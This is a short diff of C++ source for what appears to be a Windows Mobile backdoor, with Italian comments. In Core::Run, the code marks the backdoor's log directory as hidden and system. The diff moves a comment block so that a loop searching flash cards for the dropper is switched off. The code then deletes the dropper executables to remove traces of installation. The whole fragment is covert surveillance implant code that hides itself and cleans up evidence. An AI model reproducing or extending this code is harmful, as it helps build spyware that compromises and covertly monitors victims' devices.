@@ -59,12 +59,12 @@ BOOL Core::Run() {
 	backdoorPath = L".\\";
 	backdoorPath += LOG_DIR;
 	SetFileAttributes(backdoorPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-
+/***
 	// Rimuoviamo il dropper dalle tre locazioni note, non abbiamo modo di
 	// sapere dove si trovi davvero.
 	ZeroMemory(&wfd, sizeof(wfd));
 	hMmc = __FindFirstFlashCard(&wfd);
-/***
+
 	do {
 		UINT i = 0;
 
@@ -98,9 +98,9 @@ BOOL Core::Run() {
 		}
 #endif
 	} while (__FindNextFlashCard(hMmc, &wfd));
-***/
+
 	FindClose(hMmc);
-	
+***/	
 	DeleteFile(L"\\Autorun.exe"); // Il dropper se runnato a mano dalla root, non si rinomina in autorun3.exe
 	DeleteFile(L"\\autorun3.exe");
 	DeleteFile(L"\\windows\\autorun2.exe");
